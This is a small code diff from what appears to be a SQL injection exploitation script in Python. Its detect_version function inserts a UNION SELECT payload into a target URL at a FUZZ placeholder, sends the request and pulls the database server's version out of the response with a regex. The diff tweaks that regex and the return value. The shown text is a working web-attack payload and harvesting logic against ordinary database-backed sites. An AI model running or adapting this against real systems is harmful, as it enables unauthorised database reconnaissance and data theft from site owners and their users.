@@ -117,10 +117,10 @@ def detect_user(url):
 
 def detect_version(url):
     new_url=url.replace("FUZZ", "-1'union select test,concat('TOK',@@version,'TOK')")
-    search_pattern = "TOK([a-zA-Z0-9].+?)TOK"
+    search_pattern = "TOK([a-zA-Z0-9].+?)TOK+?"
     req = requests.get(new_url)
     version = re.search(search_pattern,req.text)
-    return version
+    return version[0]
 
 if __name__ == "__main__":
     try:
